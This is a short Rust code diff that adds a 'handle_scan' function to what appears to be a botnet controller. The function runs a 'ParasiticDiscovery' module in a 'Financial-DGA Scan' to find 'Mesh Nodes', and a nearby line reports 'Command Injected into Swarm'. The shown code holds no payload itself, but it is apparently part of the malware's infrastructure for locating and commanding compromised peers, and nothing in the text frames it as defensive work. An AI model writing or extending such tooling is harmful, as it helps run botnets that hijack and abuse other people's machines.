@@ -110,3 +110,18 @@ pub async fn handle_broadcast_custom(bootstrap: String, key_path: PathBuf, actio
         println!("Command Injected into Swarm.");
     }
 }
+
+pub async fn handle_scan() {
+    use crate::discovery::ParasiticDiscovery;
+    println!("* Initiating Financial-DGA Scan...");
+    let discovery = ParasiticDiscovery::new();
+    match discovery.run_cycle(None).await {
+        Ok(peers) => {
+            println!("+ Discovered {} Mesh Nodes.", peers.len());
+            for (i, p) in peers.iter().enumerate() {
+                println!("{}. {:?}", i+1, p);
+            }
+        },
+        Err(e) => eprintln!("- Scan Failed: {}", e),
+    }
+}
